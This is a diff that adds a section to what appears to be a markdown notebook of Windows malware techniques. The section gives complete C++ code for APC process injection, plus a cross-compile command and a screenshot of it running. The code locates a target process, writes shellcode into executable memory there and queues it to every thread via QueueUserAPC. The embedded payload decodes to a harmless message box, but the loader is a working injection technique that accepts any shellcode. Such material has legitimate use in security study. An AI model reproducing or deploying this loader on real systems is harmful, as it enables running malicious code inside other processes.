@@ -287,4 +287,160 @@ x86_64-w64-mingw32-g++ apc_inject.cpp -o apc_inject -I/usr/share/mingw-w64/inclu
 
 ---
 
+# 🚀 APC injection via Queue an APC into all the threads
+
+```cpp
+/*
+APC injection via Queue an APC into all the threads...
+*/
+
+#include <windows.h>
+#include <stdlib.h>
+#include <string.h>
+#include <tlhelp32.h>
+#include <vector>
+#include <stdio.h>
+
+unsigned char payload[] = "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
+	"\x51\x41\x50\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60"
+	"\x48\x8b\x52\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x0f\xb7"
+	"\x4a\x4a\x48\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02"
+	"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
+	"\x52\x20\x8b\x42\x3c\x41\x51\x48\x01\xd0\x66\x81\x78\x18"
+	"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
+	"\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x8b"
+	"\x48\x18\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88"
+	"\x4d\x31\xc9\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d"
+	"\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
+	"\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
+	"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41"
+	"\x58\x41\x58\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41"
+	"\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
+	"\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
+	"\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
+	"\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x2a"
+	"\x00\x00\x00\x48\x65\x79\x20\x62\x61\x62\x79\x2e\x2e\x2e"
+	"\x2e\x2e\x2e\x2e\x41\x50\x43\x20\x69\x6e\x6a\x65\x63\x74"
+	"\x69\x6f\x6e\x20\x76\x69\x61\x20\x51\x75\x65\x75\x65\x21"
+	"\x21\x21\x00\x5a\xe8\x0a\x00\x00\x00\x66\x72\x6f\x6d\x20"
+	"\x4b\x41\x4e\x54\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83"
+	"\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
+	"\xd5";
+
+unsigned int payload_len = sizeof(payload);
+
+int findMyProc(const char *procname) {
+
+	HANDLE hSnapshot;
+	PROCESSENTRY32 pe;
+	int pid = 0;
+	BOOL hResult;
+
+	//snapshot of all processes in the system
+	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+
+	//initializing size needed for using Process32First
+	pe.dwSize = sizeof(PROCESSENTRY32);
+
+	//info about first process encounterd in snapshot...
+	hResult = Process32First(hSnapshot, &pe);
+
+	//retrieve information about the processes
+	//exit if unsucessful...
+	while (hResult) {
+		// if process id found return it....
+		if(strcmp(procname, pe.szExeFile) == 0) {
+			pid = pe.th32ProcessID;
+			break;
+		}
+		hResult = Process32Next(hSnapshot, &pe);
+	}
+
+	//close an open handle (CreateToolhelp32Snapshot)
+	CloseHandle(hSnapshot);
+	return pid;
+}
+
+//find process by thread id...
+
+DWORD getTids(DWORD pid, std::vector<DWORD>& tids) {
+	HANDLE hSnapshot;
+	THREADENTRY32 te;
+	te.dwSize = sizeof(THREADENTRY32);
+
+	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
+	if (Thread32First(hSnapshot, &te)) {
+		do {
+			if (pid == te.th32OwnerProcessID) {
+				tids.push_back(te.th32ThreadID);
+			}
+		} while (Thread32Next(hSnapshot, &te));
+	}
+
+	CloseHandle(hSnapshot);
+	return !tids.empty();
+
+}
+
+int main(int argc, char* argv[]) {
+	DWORD pid = 0; //process id...
+	HANDLE ph; // process handle...
+	HANDLE ht; //thread handle
+	LPVOID rb; //remote buffer...
+	std::vector<DWORD> tids; //thread ids.......
+
+	pid = findMyProc(argv[1]);
+	if(pid == 0) {
+		printf("PID not found you donkey....\n");
+		return -1;
+	} else {
+		printf("PID = %d\n", pid);
+
+		ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
+		if (ph == NULL) {
+			printf("OpenProcess failed!!....\n");
+			return -2;
+		}
+		//allocate memory for buffer.......
+		rb = VirtualAllocEx(ph, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+		// write payload to memory buffer...
+		WriteProcessMemory(ph, rb, payload, payload_len, NULL);
+
+		if(getTids(pid, tids)) {
+			for (DWORD tid : tids) {
+				HANDLE ht = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
+				if (ht) {
+					QueueUserAPC((PAPCFUNC)rb, ht, NULL);
+					printf("paylod injected via QueueUserAPC baby!!!\n");
+					CloseHandle(ht);
+				}
+			}
+		}
+		CloseHandle(ph);
+
+	}
+	return 0;
+}
+
+```
+
+---
+
+## Cross Compilation
+
+```bash
+x86_64-w64-mingw32-g++ mark2.cpp -o mark2 -I/usr/share/mingw-w64/include -L/usr/lib -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -Wnarrowing -fexceptions
+```
+
+## Execution:
+
+<img width="1172" height="660" alt="Screenshot 2025-10-16 at 11 13 59 AM" src="https://github.com/user-attachments/assets/ccc122e7-a15c-4b2e-a6a7-42f56d9aeb4d" />
+
+
+---
+---
+
+
 
